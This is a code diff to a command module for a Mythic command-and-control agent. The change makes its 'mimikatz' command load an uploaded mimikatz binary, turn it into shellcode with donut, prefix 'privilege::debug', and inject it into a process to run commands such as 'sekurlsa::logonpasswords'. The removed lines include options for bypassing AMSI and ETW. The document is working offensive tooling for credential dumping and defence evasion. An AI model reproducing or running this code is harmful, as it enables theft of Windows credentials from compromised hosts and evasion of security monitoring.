@@ -8,6 +8,7 @@ import base64
 # BOF utilities
 from .utils.mythicrpc_utilities import *
 from .utils.bof_utilities import *
+import donut
 
 logging.basicConfig(level=logging.INFO)
 
@@ -17,111 +18,12 @@ class MimikatzArguments(TaskArguments):
         super().__init__(command_line, **kwargs)
         self.args = [
             CommandParameter(
-                name="assembly_name",
-                cli_name="Assembly",
-                display_name="Assembly",
-                type=ParameterType.ChooseOne,
-                dynamic_query_function=self.get_files,
-                description="Already existing .NET assembly to execute (e.g. SharpUp.exe)",
-                parameter_group_info=[
-                    ParameterGroupInfo(
-                        required=True,
-                        group_name="Default",
-                        ui_position=1
-                    )
-                ]),
-            CommandParameter(
-                name="assembly_file",
-                display_name="New Assembly",
-                type=ParameterType.File,
-                description="A new .NET assembly to execute. After uploading once, you can just supply the -Assembly parameter",
-                parameter_group_info=[
-                    ParameterGroupInfo(
-                        required=True, 
-                        group_name="New Assembly", 
-                        ui_position=1,
-                    )
-                ]
-            ),
-            CommandParameter(
-                name="assembly_arguments",
+                name="mimi_arguments",
                 cli_name="Arguments",
                 display_name="Arguments",
                 type=ParameterType.String,
-                description="Arguments to pass to the assembly.",
+                description="mimikatz.exe arguments. (e.g., sekurlsa::logonpasswords)",
                 default_value="",
-                parameter_group_info=[
-                    ParameterGroupInfo(
-                        required=False, group_name="Default", ui_position=2,
-                    ),
-                    ParameterGroupInfo(
-                        required=False, group_name="New Assembly", ui_position=2
-                    ),
-                ],
-            ),
-            CommandParameter(
-                name="assembly_arguments",
-                cli_name="Arguments",
-                display_name="Arguments",
-                type=ParameterType.String,
-                description="Arguments to pass to the assembly.",
-                default_value="",
-                parameter_group_info=[
-                    ParameterGroupInfo(
-                        required=False, group_name="Default", ui_position=2,
-                    ),
-                    ParameterGroupInfo(
-                        required=False, group_name="New Assembly", ui_position=2
-                    ),
-                ],
-            ),
-            CommandParameter(
-                name="patch_exit",
-                cli_name="-patchexit",
-                display_name="patchexit",
-                type=ParameterType.Boolean,
-                description="Patches System.Environment.Exit to prevent Beacon process from exiting",
-                default_value=False,
-                parameter_group_info=[
-                    ParameterGroupInfo(
-                        required=False, group_name="Default", ui_position=3,
-                    ),
-                    ParameterGroupInfo(
-                        required=False, group_name="New Assembly", ui_position=3
-                    ),
-                ],
-            ),
-            CommandParameter(
-                name="amsi",
-                cli_name="-amsi",
-                display_name="amsi",
-                type=ParameterType.Boolean,
-                description="Bypass AMSI by patching clr.dll instead of amsi.dll to avoid common detections",
-                default_value=False,
-                parameter_group_info=[
-                    ParameterGroupInfo(
-                        required=False, group_name="Default", ui_position=4,
-                    ),
-                    ParameterGroupInfo(
-                        required=False, group_name="New Assembly", ui_position=4
-                    ),
-                ],
-            ),
-            CommandParameter(
-                name="etw",
-                cli_name="-etw",
-                display_name="etw",
-                type=ParameterType.Boolean,
-                description="Bypass ETW by EAT Hooking advapi32.dll!EventWrite to point to a function that returns right away",
-                default_value=False,
-                parameter_group_info=[
-                    ParameterGroupInfo(
-                        required=False, group_name="Default", ui_position=5,
-                    ),
-                    ParameterGroupInfo(
-                        required=False, group_name="New Assembly", ui_position=5
-                    ),
-                ],
             ),
         ]
     
@@ -174,15 +76,15 @@ class MimikatzArguments(TaskArguments):
 class MimikatCommand(CoffCommandBase):
     cmd = "mimikatz"
     needs_admin = False
-    help_cmd = "mimikatz -Arguments [args]"
-    description = "Execute mimikatz on the host. OPSEC Warning: Uses donut shellcode."
+    help_cmd = "mimikatz [args]"
+    description = "Execute mimikatz on the host. (e.g., mimikatz sekurlsa::logonpasswords) OPSEC Warning: Uses donut shellcode."
     version = 1
     author = "@c0rnbread"
     script_only = True
     attackmapping = []
     argument_class = MimikatzArguments
     attributes = CommandAttributes(
-        dependencies=["inline_execute"],
+        dependencies=["inject_shellcode"],
         alias=True
     )
 
@@ -197,9 +99,11 @@ class MimikatCommand(CoffCommandBase):
                 1. Parse arguments
                     a. mimi arguments
                 2. generate PIC for mimikatz
-                3. Get file id for inject_spawn.x64.o
+                3. See if using PROCESS INJECT KIT
+                    a. Get file id for inject_spawn.x64.o
+                4. Add arg for process injection method
                 
-                4. send subtask
+                5. Send subtask
         '''
         try:
 
@@ -209,12 +113,52 @@ class MimikatCommand(CoffCommandBase):
             #                                    #
             ######################################      
                   
+            file_resp = await SendMythicRPCFileSearch(MythicRPCFileSearchMessage(
+                    TaskID=taskData.Task.ID,
+                    Filename="mimikatz.x64.exe",
+                    LimitByCallback=False,
+                    MaxResults=1
+                ))
             
-            # Process Injection Kit
-            file_name = "inject_spawn.x64.o"
-            # Usually this BOF takes ignoreToken and ptr PIC dll but we don't care about either.
-            arguments = []
+            if file_resp.Success:
+                if len(file_resp.Files) > 0:
+                    # Get the file contents of mimikatz
+                    mimikatz_contents = await SendMythicRPCFileGetContent(
+                        MythicRPCFileGetContentMessage(AgentFileId=file_resp.Files[0].AgentFileId)
+                    )
+                elif len(file_resp.Files) == 0:
+                    raise Exception("Failed to find the named file. Have you uploaded it before? Did it get deleted?")
+            else:
+                raise Exception("Error from Mythic trying to search files:\n" + str(file_resp.Error))
+
+            # Need a physical path for donut.create()
+            fd, temppath = tempfile.mkstemp(suffix='.exe')
+            logging.info(f"Writing mimikatz Contents to temporary file \"{temppath}\"")
+            with os.fdopen(fd, 'wb') as tmp:
+                tmp.write(mimikatz_contents.Content)
+
+            # Bypass=None, ExitOption=exit process
+            mimi_args = taskData.args.get_arg('mimi_arguments')
+            full_args = f"privilege::debug {mimi_args} exit"
+            mimi_shellcode = donut.create(file=temppath, params=full_args, bypass=1, exit_opt=2)
+            # Clean up temp file
+            os.remove(temppath)
             
+            logging.info(f"Converted Mimikatz into Shellcode {len(mimi_shellcode)} bytes")
+
+            response.DisplayParams = "{}".format(mimi_args)
+            
+            shellcode_file_resp = await SendMythicRPCFileCreate(
+                MythicRPCFileCreateMessage(
+                    TaskID=taskData.Task.ID, 
+                    FileContents=mimi_shellcode, 
+                    DeleteAfterFetch=True)
+            )
+            
+            if shellcode_file_resp.Success:
+                shellcode_file_uuid = shellcode_file_resp.AgentFileId
+            else:
+                raise Exception("Failed to register execute_assembly binary: " + shellcode_file_resp.Error)
             
             # Debugging
             # logging.info(taskData.args.to_json())
@@ -223,12 +167,10 @@ class MimikatCommand(CoffCommandBase):
             subtask = await SendMythicRPCTaskCreateSubtask(
                 MythicRPCTaskCreateSubtaskMessage(
                     taskData.Task.ID,
-                    CommandName="inline_execute",
+                    CommandName="inject_shellcode",
                     SubtaskCallbackFunction="coff_completion_callback",
                     Params=json.dumps({
-                        "bof_name": file_name,
-                        "bof_arguments": arguments,
-                        "mimikatz_file": mimikatz_file
+                        "shellcode_file": shellcode_file_uuid
                     }),
                     Token=taskData.Task.TokenID,
                 )
